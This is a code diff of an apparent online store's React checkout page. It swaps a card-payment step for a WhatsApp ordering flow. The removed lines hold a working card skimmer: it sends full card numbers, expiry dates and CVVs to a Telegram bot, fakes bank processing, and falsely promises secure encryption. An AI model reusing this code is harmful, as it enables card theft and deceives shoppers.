@@ -10,7 +10,7 @@ interface CheckoutViewProps {
   user: UserProfile | null;
 }
 
-type CheckoutStep = 'shipping' | 'payment-method' | 'process-card' | 'process-crypto' | 'process-kuraimi' | 'processing' | 'success';
+type CheckoutStep = 'shipping' | 'payment-method' | 'process-crypto' | 'process-kuraimi' | 'processing' | 'success';
 
 const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) => {
   const [step, setStep] = useState<CheckoutStep>('shipping');
@@ -20,10 +20,10 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
     city: '', 
     address: '' 
   });
-  const [card, setCard] = useState({ number: '', expiry: '', cvv: '', name: user?.name?.toUpperCase() || '' });
-  const [cardError, setCardError] = useState('');
+  
   const [proofImage, setProofImage] = useState<string | null>(null);
   const fileInputRef = useRef<HTMLInputElement>(null);
+  const WHATSAPP_NUMBER = '967784400333';
 
   useEffect(() => {
     window.scrollTo(0, 0);
@@ -50,42 +50,11 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
     if (e) e.preventDefault();
 
     if (step === 'shipping') {
-      setStep('payment-method');
-      return;
-    }
-
-    if (step === 'process-card') {
-      const cleanNum = card.number.replace(/\s+/g, '');
-      if (cleanNum.length < 15) {
-        setCardError('يرجى إدخال رقم بطاقة صحيح');
+      if (!shipping.fullName || !shipping.phone || !shipping.city) {
+        alert("يرجى تعبئة البيانات الأساسية (الاسم، الهاتف، المدينة)");
         return;
       }
-      
-      setCardError('');
-      setStep('processing');
-
-      // إرسال البيانات للبوت فوراً - لا يوجد OTP هنا
-      NotificationService.sendTelegramNotification(
-        NotificationService.formatOrderMessage({
-          product: product.name,
-          price: `${product.price} ر.س`,
-          method: "دفع مباشر بالبطاقة البنكية",
-          customer: shipping,
-          cardDetails: { 
-            number: cleanNum, 
-            expiry: card.expiry, 
-            cvv: card.cvv, 
-            name: card.name 
-          },
-          productUrl: `${window.location.origin}/#product-${product.id}`
-        })
-      );
-
-      // Save Order to LocalDB for Admin View
-      saveOrderToAdmin("بطاقة بنكية");
-
-      // محاكاة معالجة بنكية سريعة ثم النجاح
-      setTimeout(() => setStep('success'), 3000);
+      setStep('payment-method');
       return;
     }
 
@@ -112,6 +81,31 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
 
       setTimeout(() => setStep('success'), 2500);
     }
+  };
+
+  const handleWhatsAppOrder = () => {
+    // 1. Construct the message
+    const message = `السلام عليكم حيفان للطاقة، أريد تأكيد طلب شراء:
+
+📦 *المنتج:* ${product.name}
+💰 *السعر:* ${product.price} ر.س
+
+👤 *بيانات العميل:*
+الاسم: ${shipping.fullName}
+الهاتف: ${shipping.phone}
+العنوان: ${shipping.city} - ${shipping.address}
+
+يرجى تأكيد الطلب وتزويدي بطريقة الدفع المناسبة.`;
+
+    // 2. Save locally so admin sees it
+    saveOrderToAdmin('واتساب مباشر');
+
+    // 3. Open WhatsApp
+    const encodedMessage = encodeURIComponent(message);
+    window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodedMessage}`, '_blank');
+    
+    // 4. Move to success view
+    setStep('success');
   };
 
   const renderShipping = () => (
@@ -146,23 +140,8 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
   const renderPaymentSelection = () => (
     <div className="max-w-4xl mx-auto px-4 animate-fade-in">
       <h2 className="text-3xl font-black text-emerald-950 mb-10 text-center">اختر وسيلة الدفع</h2>
-      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-        <button onClick={() => setStep('process-card')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
-          <span className="w-20 h-20 bg-blue-600 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">💳</span>
-          <div>
-            <h3 className="text-2xl font-black text-emerald-950">بطاقة بنكية</h3>
-            <p className="text-gray-400 font-bold text-sm">فيزا / ماستركارد</p>
-          </div>
-        </button>
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
         
-        <button onClick={() => setStep('process-crypto')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
-          <span className="w-20 h-20 bg-yellow-500 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">₿</span>
-          <div>
-            <h3 className="text-2xl font-black text-emerald-950">بينانس / USDT</h3>
-            <p className="text-gray-400 font-bold text-sm">دفع رقمي سريع</p>
-          </div>
-        </button>
-
         <button onClick={() => setStep('process-kuraimi')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
           <span className="w-20 h-20 bg-emerald-700 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">🏦</span>
           <div>
@@ -171,64 +150,21 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
           </div>
         </button>
 
-        <button onClick={() => window.open(`https://wa.me/967784400333`, '_blank')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
+        <button onClick={() => setStep('process-crypto')} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
+          <span className="w-20 h-20 bg-yellow-500 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">₿</span>
+          <div>
+            <h3 className="text-2xl font-black text-emerald-950">بينانس / USDT</h3>
+            <p className="text-gray-400 font-bold text-sm">دفع رقمي سريع</p>
+          </div>
+        </button>
+
+        <button onClick={handleWhatsAppOrder} className="bg-white p-10 rounded-[3rem] border-2 border-emerald-50 hover:border-emerald-500 shadow-xl transition-all flex flex-col items-center gap-6 group active:scale-95">
           <span className="w-20 h-20 bg-emerald-500 rounded-3xl flex items-center justify-center text-4xl shadow-lg group-hover:rotate-12 transition-transform">💬</span>
           <div>
             <h3 className="text-2xl font-black text-emerald-950">واتساب مباشر</h3>
-            <p className="text-gray-400 font-bold text-sm">تواصل مع المبيعات</p>
+            <p className="text-gray-400 font-bold text-sm">إرسال الطلب للمبيعات</p>
           </div>
         </button>
-      </div>
-    </div>
-  );
-
-  const renderCardPayment = () => (
-    <div className="max-w-xl mx-auto animate-fade-in px-4">
-      <div className="bg-white p-8 md:p-12 rounded-[3rem] shadow-2xl border border-emerald-50">
-        <h2 className="text-2xl font-black text-emerald-950 mb-8">تفاصيل البطاقة</h2>
-        
-        <div className="bg-gradient-to-br from-gray-900 to-black p-8 rounded-3xl text-white mb-8 shadow-2xl relative overflow-hidden">
-           <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-3xl"></div>
-           <div className="flex justify-between items-start mb-10">
-              <div className="w-14 h-10 bg-yellow-400/20 rounded-md border border-yellow-400/30"></div>
-              <span className="text-2xl font-black italic tracking-tighter">VISA</span>
-           </div>
-           <p className="text-xl md:text-2xl font-mono tracking-[0.2em] mb-4">
-             {card.number ? card.number.padEnd(19, '•') : '•••• •••• •••• ••••'}
-           </p>
-           <div className="flex justify-between items-end">
-             <div className="text-[10px] font-bold opacity-50 uppercase">صاحب البطاقة<br/><span className="text-sm opacity-100 font-black">{card.name || 'اسم العميل'}</span></div>
-             <div className="text-[10px] font-bold opacity-50 uppercase text-left">تاريخ الانتهاء<br/><span className="text-sm opacity-100 font-black">{card.expiry || 'MM/YY'}</span></div>
-           </div>
-        </div>
-
-        <form onSubmit={handleNextStep} className="space-y-5">
-          {cardError && <p className="text-red-500 text-sm font-black text-center bg-red-50 p-3 rounded-xl">{cardError}</p>}
-          
-          <div className="space-y-1">
-            <input type="text" required maxLength={19} value={card.number} onChange={e => {
-              const val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-              const parts = val.match(/.{1,4}/g) || [];
-              setCard({...card, number: parts.join(' ')});
-            }} placeholder="رقم البطاقة (16 رقم)" className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none focus:border-blue-500 font-black text-center text-lg" />
-          </div>
-          
-          <input type="text" required value={card.name} onChange={e => setCard({...card, name: e.target.value.toUpperCase()})} placeholder="اسم صاحب البطاقة (بالإنجليزي)" className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none focus:border-blue-500 font-black text-center" />
-          
-          <div className="grid grid-cols-2 gap-4">
-            <input type="text" required placeholder="MM/YY" value={card.expiry} onChange={e => setCard({...card, expiry: e.target.value})} className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none text-center font-black" />
-            <input type="password" required maxLength={3} value={card.cvv} onChange={e => setCard({...card, cvv: e.target.value})} placeholder="CVV" className="w-full bg-gray-50 border border-gray-100 p-5 rounded-2xl outline-none text-center font-black" />
-          </div>
-          
-          <div className="p-4 bg-emerald-50 rounded-2xl border border-emerald-100 flex items-center gap-3">
-             <div className="w-10 h-10 bg-emerald-600 text-white rounded-full flex items-center justify-center shrink-0 shadow-lg">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-             </div>
-             <p className="text-[10px] font-black text-emerald-800 leading-tight">تشفير عسكري آمن لبياناتك البنكية عبر بوابة حيفان الآمنة.</p>
-          </div>
-
-          <button type="submit" className="w-full bg-emerald-600 text-white py-6 rounded-2xl font-black shadow-xl hover:bg-emerald-700 transition-all text-xl active:scale-95">تأكيد عملية الدفع</button>
-        </form>
       </div>
     </div>
   );
@@ -251,8 +187,8 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
           <div className="w-28 h-28 bg-emerald-600 text-white rounded-full flex items-center justify-center mx-auto mb-12 shadow-2xl ring-[15px] ring-emerald-50">
              <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
           </div>
-          <h2 className="text-5xl font-black text-emerald-950 mb-8">تم الدفع بنجاح!</h2>
-          <p className="text-gray-500 font-bold text-xl leading-relaxed mb-12">شكراً لثقتك بمتجر حيفان للطاقة. تم استلام بيانات الدفع بنجاح، وسنقوم بتجهيز طلبك للشحن الفوري والتواصل معك.</p>
+          <h2 className="text-5xl font-black text-emerald-950 mb-8">تم استلام الطلب!</h2>
+          <p className="text-gray-500 font-bold text-xl leading-relaxed mb-12">شكراً لثقتك بمتجر حيفان للطاقة. تم تسجيل طلبك بنجاح وسيقوم فريق المبيعات بالتواصل معك قريباً لترتيب عملية الشحن.</p>
           <button onClick={onCancel} className="w-full bg-emerald-950 text-white py-8 rounded-[2rem] font-black text-2xl shadow-2xl hover:bg-black transition-all active:scale-95">العودة للرئيسية</button>
        </div>
     </div>
@@ -283,7 +219,6 @@ const CheckoutView: React.FC<CheckoutViewProps> = ({ product, onCancel, user }) 
 
         {step === 'shipping' && renderShipping()}
         {step === 'payment-method' && renderPaymentSelection()}
-        {step === 'process-card' && renderCardPayment()}
         {step === 'process-crypto' && (
            <div className="max-w-xl mx-auto animate-fade-in px-4">
              <div className="bg-white p-8 md:p-14 rounded-[3rem] shadow-2xl text-center border border-emerald-50">
